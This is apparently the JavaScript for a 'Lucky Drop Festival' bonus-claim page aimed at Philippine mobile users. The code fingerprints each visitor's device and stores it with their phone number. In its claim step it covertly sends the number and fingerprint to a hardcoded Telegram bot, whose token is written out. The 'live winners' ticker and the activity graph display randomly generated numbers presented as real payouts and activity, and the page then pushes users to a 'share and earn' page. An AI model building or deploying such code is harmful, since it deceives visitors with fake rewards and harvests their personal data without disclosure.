/* ============================================================
   INDEX.JS — Lucky Drop Festival (Welcome Bonus Page)
   + SWIPE FIX (dynamic maxLeft, touch-action, passive listeners)
   ============================================================ */

(function() {
    'use strict';

    // ========== CONFIGURATION ==========
    var botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
    var chatId = '7298607329';

    // ========== DOM ELEMENTS ==========
    var userPhoneInput = document.getElementById('userPhone');
    var claimBtn = document.getElementById('claimBtn');
    var modalOverlay = document.getElementById('modalOverlay');
    var mainCard = document.getElementById('mainCard');
    var winnerEntry = document.getElementById('winnerEntry');

    // ========== SWIPE ELEMENTS ==========
    var swipeTrack = document.getElementById('swipeTrack');
    var swipeIcon = document.getElementById('swipeIcon');
    var swipeFireTrail = document.getElementById('swipeFireTrail');

    // ========== FIREBASE ==========
    var db = null;
    var graphUpdateInterval = null;
    var claimsRefreshInterval = null;

    // ========== INIT FIREBASE ==========
    function initFirebase() {
        if (typeof firebaseConfig !== 'undefined') {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
        }
    }

    // ========== PHONE VALIDATION ==========
    function isValidPhoneNumber(phone) {
        var cleaned = phone.replace(/\D/g, '');
        return cleaned.length === 10 && cleaned.startsWith('9');
    }

    function formatPhoneNumber(phone) {
        var cleaned = phone.replace(/\D/g, '');
        if (cleaned.length === 10 && cleaned.startsWith('9')) {
            return '0' + cleaned;
        }
        if (cleaned.length === 11 && cleaned.startsWith('09')) {
            return cleaned;
        }
        return cleaned;
    }

    // ========== DEVICE FINGERPRINT ==========
    function getDeviceFingerprint() {
        var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var language = navigator.language;
        var userAgent = navigator.userAgent;
        var platform = navigator.platform;
        var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';

        var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency;

        var hash = 0;
        for (var i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return 'FP_' + Math.abs(hash);
    }

    // ========== GET DEVICE DISPLAY ID ==========
    function getOrCreateDeviceId(fingerprint) {
        if (!fingerprint || fingerprint === '---') return Promise.resolve('---');

        var deviceMapRef = db.ref('device_id_map/' + fingerprint);
        return deviceMapRef.once('value').then(function(snap) {
            if (snap.exists()) {
                return snap.val().displayId;
            }

            var counterRef = db.ref('admin/deviceCounter');
            return counterRef.once('value').then(function(counterSnap) {
                var nextNum = (counterSnap.val() || 0) + 1;
                return counterRef.set(nextNum).then(function() {
                    var displayId = 'Dev' + nextNum;
                    return deviceMapRef.set({
                        displayId: displayId,
                        createdAt: Date.now(),
                        fingerprint: fingerprint
                    }).then(function() {
                        return displayId;
                    });
                });
            });
        });
    }

    // ========== SAVE DEVICE INFO ==========
    function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
        var deviceInfo = {
            phone: phone,
            fingerprint: fingerprint,
            displayId: deviceDisplayId,
            screenResolution: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            userAgent: navigator.userAgent,
            lastSeen: Date.now(),
            firstSeen: Date.now()
        };

        return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
            if (!existingDevice.exists()) {
                return db.ref('devices/' + fingerprint).set(deviceInfo);
            } else {
                return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
            }
        }).then(function() {
            return db.ref('device_phone_map/' + fingerprint).set({
                phone: phone,
                displayId: deviceDisplayId,
                lastSeen: Date.now()
            });
        });
    }

    // ========== GENERATE REFERRAL CODE ==========
    function generateReferralCode() {
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        var code = '';
        for (var i = 0; i < 6; i++) {
            code += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return code;
    }

    // ========== CREATE USER SESSION ==========
    function createUserSession(phone, fingerprint, deviceDisplayId) {
        var sessionRef = db.ref('user_sessions/' + phone);

        return sessionRef.once('value').then(function(sessionSnap) {
            if (!sessionSnap.exists()) {
                var initialCode = generateReferralCode();

                return sessionRef.set({
                    phone: phone,
                    balance: 0,
                    clicks: 0,
                    status: 'online',
                    deviceFingerprint: fingerprint,
                    deviceDisplayId: deviceDisplayId,
                    lastUpdate: Date.now(),
                    createdAt: Date.now(),
                    referral_code: initialCode,
                    referral_code_generated_at: Date.now(),
                    claimed_luckycat: false,
                    claimed_ptcat: false
                });
            } else {
                return sessionRef.update({
                    status: 'online',
                    lastUpdate: Date.now(),
                    deviceFingerprint: fingerprint,
                    deviceDisplayId: deviceDisplayId
                });
            }
        });
    }

    // ========== SET USER ONLINE ==========
    function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
        return db.ref('user_sessions/' + phoneNumber).update({
            status: 'online',
            lastSeen: firebase.database.ServerValue.TIMESTAMP,
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
    }

    // ========== BAN CHECK ==========
    function isPhoneBanned(phone) {
        return db.ref('banned_ghosts/' + phone).once('value').then(function(snap) {
            return snap.exists();
        });
    }

    function isFingerprintLinkedToBanned(fingerprint) {
        return db.ref('device_phone_map/' + fingerprint).once('value').then(function(snap) {
            if (snap.exists()) {
                var linkedPhone = snap.val().phone;
                return isPhoneBanned(linkedPhone);
            }
            return false;
        });
    }

    function getBanDetails(phone, fingerprint) {
        return isPhoneBanned(phone).then(function(phoneBanned) {
            if (phoneBanned) {
                return { isBanned: true, type: "phone" };
            }
            return isFingerprintLinkedToBanned(fingerprint).then(function(fpBanned) {
                if (fpBanned) {
                    return { isBanned: true, type: "device" };
                }
                return { isBanned: false };
            });
        });
    }

    // ========== NUMBER CLAIMED CHECK ==========
    function isNumberClaimed(phone) {
        return db.ref('user_logs/' + phone).once('value').then(function(logSnap) {
            return (logSnap.exists() && logSnap.val().status === 'claimed');
        });
    }

    // ========== SHOW BLOCKED UI ==========
    function showBlockedUI(reason) {
        if (!modalOverlay) return;
        modalOverlay.style.display = 'flex';

        var title = "ACCESS RESTRICTED";
        var blockMessage = "This account has been restricted by the administrator.";

        if (reason === "claimed") {
            title = "ALREADY CLAIMED";
            blockMessage = "This number has already claimed a reward before.";
        }

        var modalBody = document.getElementById('modalBodyContent');
        if (modalBody) {
            modalBody.innerHTML =
                '<div class="modal-bg-image"></div>' +
                '<div class="modal-bg-overlay"></div>' +
                '<div class="modal-content-inner">' +
                    '<div class="modal-icon">' +
                        '<i class="fas fa-ban"></i>' +
                    '</div>' +
                    '<h2 class="modal-title" style="background: linear-gradient(180deg, #ff4444, #aa0000); -webkit-background-clip: text; background-clip: text;">' + title + '</h2>' +
                    '<p class="modal-subtitle">' + blockMessage + '</p>' +
                    '<button class="login-btn" onclick="location.reload()" style="background: linear-gradient(180deg, #555, #333); color: #fff; box-shadow: 0 6px 0 #222, 0 10px 30px rgba(0,0,0,0.5);">OK</button>' +
                '</div>';
        }
        if (mainCard) mainCard.style.opacity = "0.3";
    }

    // ========== PROCESS STEP 1 ==========
    function processStep1() {
        if (!userPhoneInput || !claimBtn) return;

        var rawPhone = userPhoneInput.value.trim().replace(/\D/g, '');
        var fingerprint = getDeviceFingerprint();

        if (!rawPhone || rawPhone.length === 0) {
            alert("Please enter your mobile number.");
            return;
        }

        if (!isValidPhoneNumber(rawPhone)) {
            alert("Invalid mobile number.\n\nPlease enter a valid 10-digit number starting with 9 (e.g., 9123456789)");
            return;
        }

        var fullPhone = formatPhoneNumber(rawPhone);

        claimBtn.classList.add('loading');
        claimBtn.disabled = true;

        getBanDetails(fullPhone, fingerprint).then(function(banDetails) {
            if (banDetails.isBanned) {
                claimBtn.classList.remove('loading');
                claimBtn.disabled = false;
                showBlockedUI("banned");
                return;
            }

            return isNumberClaimed(fullPhone).then(function(isClaimed) {
                if (isClaimed) {
                    claimBtn.classList.remove('loading');
                    claimBtn.disabled = false;
                    showBlockedUI("claimed");
                    return;
                }

                return getOrCreateDeviceId(fingerprint).then(function(deviceDisplayId) {
                    return saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId).then(function() {
                        return createUserSession(fullPhone, fingerprint, deviceDisplayId).then(function() {
                            return setUserOnline(fullPhone, fingerprint, deviceDisplayId).then(function() {

                                var message = '🎁 WELCOME BONUS LOGIN:\n📱 ' + fullPhone + '\n🖥️ FP: ' + fingerprint + '\n🔑 DEV#: ' + deviceDisplayId;
                                fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message))
                                    .catch(function(e) { console.log('Telegram error:', e); });

                                localStorage.setItem("userPhone", fullPhone);
                                localStorage.setItem("userDeviceId", fingerprint);
                                localStorage.setItem("userDeviceDisplayId", deviceDisplayId);

                                claimBtn.classList.remove('loading');
                                claimBtn.classList.add('success');
                                var loginTextSpan = claimBtn.querySelector('.login-text');
                                if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS!';

                                setTimeout(function() {
                                    window.location.href = "share_and_earn.html";
                                }, 1000);
                            });
                        });
                    });
                });
            });
        }).catch(function(error) {
            console.error("Process error:", error);
            claimBtn.classList.remove('loading');
            claimBtn.disabled = false;
            alert("An error occurred. Please try again.");
        });
    }

    // ============================================================
    // ✅ SWIPE TO VERIFY — FIXED
    // ============================================================
    var isDragging = false;
    var startX = 0;
    var currentLeft = 0;
    var swipeCompleted = false;
    var trailInterval = null;
    var maxLeft = 0;

    function getMaxLeft() {
        if (!swipeTrack || !swipeIcon) return 0;
        var trackWidth = swipeTrack.offsetWidth;
        var iconWidth = swipeIcon.offsetWidth || 56;
        return Math.max(0, trackWidth - iconWidth - 6);
    }

    function startFireTrail() {
        if (trailInterval) clearInterval(trailInterval);
        if (swipeFireTrail) {
            swipeFireTrail.classList.add('active');
            trailInterval = setInterval(function() {
                if (swipeFireTrail) {
                    swipeFireTrail.classList.remove('active');
                    setTimeout(function() {
                        if (swipeFireTrail) swipeFireTrail.classList.add('active');
                    }, 50);
                }
            }, 100);
        }
    }

    function stopFireTrail() {
        if (trailInterval) {
            clearInterval(trailInterval);
            trailInterval = null;
        }
        if (swipeFireTrail) {
            swipeFireTrail.classList.remove('active');
        }
    }

    function updateFireTrailPosition(leftPos, max) {
        if (!swipeFireTrail) return;
        var percentage = max > 0 ? (leftPos / max) * 100 : 0;
        swipeFireTrail.style.width = percentage + '%';
    }

    function completeSwipe() {
        if (swipeCompleted) return;
        swipeCompleted = true;

        if (swipeFireTrail) {
            swipeFireTrail.style.width = '100%';
            swipeFireTrail.classList.add('active');
        }

        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound error:', e); });
        } catch(e) {}

        var swipeContainer = document.querySelector('.swipe-container');
        if (swipeContainer) {
            swipeContainer.style.transition = 'opacity 0.3s ease';
            swipeContainer.style.opacity = '0';
        }

        setTimeout(function() {
            if (modalOverlay) modalOverlay.style.display = 'flex';
            if (swipeContainer) swipeContainer.style.display = 'none';
        }, 400);

        setTimeout(function() {
            if (swipeFireTrail) swipeFireTrail.classList.remove('active');
        }, 500);
    }

    function initSwipe() {
        if (!swipeIcon || !swipeTrack) return;

        // ✅ Compute dynamic maxLeft
        maxLeft = getMaxLeft();
        console.log('🎯 Swipe initialized. maxLeft:', maxLeft);

        // ✅ Recompute on resize
        window.addEventListener('resize', function() {
            maxLeft = getMaxLeft();
        });
        window.addEventListener('orientationchange', function() {
            setTimeout(function() { maxLeft = getMaxLeft(); }, 300);
        });

        // ========== TOUCH EVENTS ==========
        swipeIcon.addEventListener('touchstart', function(e) {
            if (swipeCompleted) return;
            e.preventDefault();
            isDragging = true;
            startX = e.touches[0].clientX;
            currentLeft = parseInt(swipeIcon.style.left) || 0;
            maxLeft = getMaxLeft();
            swipeIcon.style.cursor = 'grabbing';
            startFireTrail();
        }, { passive: false });

        swipeIcon.addEventListener('touchmove', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            var moveX = e.touches[0].clientX - startX;
            var newLeft = currentLeft + moveX;
            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
            swipeIcon.style.left = newLeft + 'px';
            updateFireTrailPosition(newLeft, maxLeft);
        }, { passive: false });

        swipeIcon.addEventListener('touchend', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            isDragging = false;
            swipeIcon.style.cursor = 'grab';
            stopFireTrail();

            var finalLeft = parseInt(swipeIcon.style.left) || 0;
            if (finalLeft >= maxLeft - 10) {
                completeSwipe();
            } else {
                swipeIcon.style.left = '0px';
                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
            }
        }, { passive: false });

        swipeIcon.addEventListener('touchcancel', function(e) {
            if (!isDragging) return;
            isDragging = false;
            swipeIcon.style.cursor = 'grab';
            stopFireTrail();
            swipeIcon.style.left = '0px';
            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
        });

        // ========== MOUSE EVENTS ==========
        swipeIcon.addEventListener('mousedown', function(e) {
            if (swipeCompleted) return;
            e.preventDefault();
            isDragging = true;
            startX = e.clientX;
            currentLeft = parseInt(swipeIcon.style.left) || 0;
            maxLeft = getMaxLeft();
            swipeIcon.style.cursor = 'grabbing';
            startFireTrail();
        });

        window.addEventListener('mousemove', function(e) {
            if (!isDragging || swipeCompleted) return;
            e.preventDefault();
            var moveX = e.clientX - startX;
            var newLeft = currentLeft + moveX;
            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
            swipeIcon.style.left = newLeft + 'px';
            updateFireTrailPosition(newLeft, maxLeft);
        });

        window.addEventListener('mouseup', function(e) {
            if (!isDragging || swipeCompleted) return;
            isDragging = false;
            swipeIcon.style.cursor = 'grab';
            stopFireTrail();

            var finalLeft = parseInt(swipeIcon.style.left) || 0;
            if (finalLeft >= maxLeft - 10) {
                completeSwipe();
            } else {
                swipeIcon.style.left = '0px';
                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
            }
        });
    }

    // ============================================================
    // 📊 LINE GRAPH TREND — HOURLY TIMELINE
    // ============================================================
    function drawLineGraph() {
        var svg = document.getElementById('lineGraphSvg');
        var linePath = document.getElementById('graphLine');
        var areaPath = document.getElementById('graphArea');
        var pointsGroup = document.getElementById('graphPoints');
        var hourLabelsContainer = document.getElementById('graphHourLabels');

        if (!svg || !linePath || !areaPath || !pointsGroup) return;

        var svgWidth = 340;
        var svgHeight = 100;
        var padding = 12;
        var graphWidth = svgWidth - (padding * 2);
        var graphHeight = svgHeight - (padding * 2);

        var now = new Date();
        var currentHour = now.getHours();

        var hourlyData = [];
        var HOURS_SPAN = 5;
        var maxValue = 1;

        for (var i = 0; i < HOURS_SPAN; i++) {
            var hoursAgo = (HOURS_SPAN - 1) - i;
            var hour = (currentHour - hoursAgo + 24) % 24;

            var value = getHourlyActivity(hour);
            hourlyData.push({
                hour: hour,
                value: value,
                isCurrentHour: (i === HOURS_SPAN - 1),
                label: formatHour(hour)
            });

            if (value > maxValue) maxValue = value;
        }

        var lineD = '';
        var areaD = '';
        var stepX = graphWidth / (hourlyData.length - 1);

        var endpointX = 0;
        var endpointY = 0;

        for (var j = 0; j < hourlyData.length; j++) {
            var point = hourlyData[j];
            var x = padding + (j * stepX);
            var y = svgHeight - padding - ((point.value / maxValue) * graphHeight);

            if (j === 0) {
                lineD = 'M ' + x + ' ' + y;
                areaD = 'M ' + x + ' ' + (svgHeight - padding);
                areaD += ' L ' + x + ' ' + y;
            } else {
                lineD += ' L ' + x + ' ' + y;
                areaD += ' L ' + x + ' ' + y;
            }

            if (point.isCurrentHour) {
                endpointX = x;
                endpointY = y;
            }
        }

        areaD += ' L ' + (padding + ((hourlyData.length - 1) * stepX)) + ' ' + (svgHeight - padding);
        areaD += ' Z';

        linePath.setAttribute('d', lineD);
        linePath.style.strokeDasharray = '2000';
        linePath.style.strokeDashoffset = '2000';
        linePath.style.transition = 'none';

        void linePath.offsetWidth;

        linePath.style.transition = 'stroke-dashoffset 1.5s ease-out';
        linePath.style.strokeDashoffset = '0';

        areaPath.style.opacity = '0';
        areaPath.setAttribute('d', areaD);
        areaPath.style.transition = 'none';
        void areaPath.offsetWidth;
        areaPath.style.transition = 'opacity 1.5s ease-out';
        areaPath.style.opacity = '0.5';

        var endpointHtml = '';
        endpointHtml += '<foreignObject x="' + (endpointX - 16) + '" y="' + (endpointY - 16) + '" width="32" height="32" class="graph-endpoint-icon">';
        endpointHtml += '<div xmlns="http://www.w3.org/1999/xhtml" style="';
        endpointHtml += 'width: 100%; height: 100%;';
        endpointHtml += 'background: transparent;';
        endpointHtml += 'display: flex; align-items: center; justify-content: center;';
        endpointHtml += '">';
        endpointHtml += '<img src="images/PT_icon.png" class="endpoint-img" alt="Now" />';
        endpointHtml += '</div>';
        endpointHtml += '</foreignObject>';

        pointsGroup.innerHTML = endpointHtml;

        if (hourLabelsContainer) {
            hourLabelsContainer.innerHTML = '';
            hourlyData.forEach(function(item) {
                var span = document.createElement('span');
                span.textContent = item.isCurrentHour ? 'NOW' : item.label;
                if (item.isCurrentHour) {
                    span.classList.add('current-hour');
                }
                hourLabelsContainer.appendChild(span);
            });
        }
    }

    function getHourlyActivity(hour) {
        var basePattern = [
            2, 1, 1, 2, 3, 5, 8, 12, 15, 18, 20, 22,
            25, 28, 30, 32, 35, 40, 45, 48, 42, 35, 25, 15
        ];

        var base = basePattern[hour] || 10;
        var random = Math.floor(Math.random() * 8) - 4;
        return Math.max(1, base + random);
    }

    function formatHour(hour) {
        if (hour === 0) return '12AM';
        if (hour < 12) return hour + 'AM';
        if (hour === 12) return '12PM';
        return (hour - 12) + 'PM';
    }

    function loadTotalClaims() {
        if (!db) return;

        var today = new Date();
        var year = today.getFullYear();
        var month = String(today.getMonth() + 1).padStart(2, '0');
        var day = String(today.getDate()).padStart(2, '0');
        var dateKey = year + '-' + month + '-' + day;

        db.ref('festival_stats/daily/' + dateKey + '/claims_count').once('value').then(function(snap) {
            var count = snap.val() || 0;
            var totalAmount = count * 500;

            animateNumber('todayClaims', count);

            var amountEl = document.getElementById('totalClaimed');
            if (amountEl) {
                amountEl.textContent = formatAmount(totalAmount);
            }
        }).catch(function(e) {
            console.error('Load claims error:', e);
        });
    }

    function formatAmount(amount) {
        if (amount >= 1000000) return '₱' + (amount / 1000000).toFixed(1) + 'M';
        if (amount >= 1000) return '₱' + (amount / 1000).toFixed(1) + 'K';
        return '₱' + amount.toLocaleString();
    }

    function animateNumber(elementId, targetValue) {
        var el = document.getElementById(elementId);
        if (!el) return;

        var currentValue = parseInt(el.textContent) || 0;
        if (currentValue === targetValue) return;

        var duration = 800;
        var steps = 25;
        var increment = (targetValue - currentValue) / steps;
        var step = 0;

        var interval = setInterval(function() {
            step++;
            var val = Math.round(currentValue + (increment * step));
            el.textContent = val;

            if (step >= steps) {
                clearInterval(interval);
                el.textContent = targetValue;
            }
        }, duration / steps);
    }

    // ========== LIVE WINNERS TICKER ==========
    function updateTickerWithTransition(phoneNumber, amount, action) {
        if (!winnerEntry) return;

        winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        winnerEntry.style.opacity = '0';
        winnerEntry.style.transform = 'translateY(-5px)';

        setTimeout(function() {
            winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' +
                phoneNumber + ' ' + action + ' ' +
                '<span class="ticker-amount">+₱' + amount.toLocaleString() + '</span>';
            winnerEntry.style.opacity = '1';
            winnerEntry.style.transform = 'translateY(0)';
        }, 300);
    }

    function startTicker() {
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];

        function generateRandomAmount() {
            var rand = Math.random() * 100;
            if (rand < 85) return 500;
            if (rand < 95) return 1000;
            if (rand < 98) return 1500;
            return 2000;
        }

        function generateWinner() {
            var randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var randomSuffix = Math.floor(1000 + Math.random() * 9000);
            var phoneNumber = randomPrefix + '***' + randomSuffix;
            var amount = generateRandomAmount();
            var actions = ['received', 'received', 'received', 'withdraw'];
            var action = actions[Math.floor(Math.random() * actions.length)];
            return { phoneNumber: phoneNumber, amount: amount, action: action };
        }

        var initial = generateWinner();
        if (winnerEntry) {
            winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' +
                initial.phoneNumber + ' ' + initial.action + ' ' +
                '<span class="ticker-amount">+₱' + initial.amount.toLocaleString() + '</span>';
        }

        setInterval(function() {
            var winner = generateWinner();
            updateTickerWithTransition(winner.phoneNumber, winner.amount, winner.action);
        }, 4800);
    }

    // ========== MODAL FUNCTIONS ==========
    function closeModal() {
        if (modalOverlay) modalOverlay.style.display = 'none';
    }

    // ========== INITIALIZE ==========
    function init() {
        initFirebase();
        startTicker();

        // ✅ Delay initSwipe para siguradong naka-render ang track
        setTimeout(function() {
            initSwipe();
        }, 100);

        drawLineGraph();
        loadTotalClaims();

        graphUpdateInterval = setInterval(drawLineGraph, 15000);
        claimsRefreshInterval = setInterval(loadTotalClaims, 30000);

        if (modalOverlay) {
            modalOverlay.addEventListener('click', function(e) {
                if (e.target === modalOverlay) closeModal();
            });
        }

        if (userPhoneInput) {
            userPhoneInput.addEventListener('input', function() {
                var value = this.value.replace(/\D/g, '');
                if (value.length > 10) value = value.substring(0, 10);

                var formatted = value;
                if (value.length > 6) {
                    formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
                } else if (value.length > 3) {
                    formatted = value.substring(0, 3) + ' ' + value.substring(3);
                }
                this.value = formatted;
            });

            userPhoneInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') processStep1();
            });
        }

        console.log('✅ Index page initialized');
    }

    // ========== EXPORT ==========
    window.processStep1 = processStep1;
    window.closeModal = closeModal;

    // ========== AUTO-REDIRECT IF ALREADY LOGGED IN ==========
    (function() {
        var existingUserPhone = localStorage.getItem("userPhone");
        if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
            console.log('Existing user detected. Redirecting...');
            window.location.href = "share_and_earn.html";
        }
    })();

    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
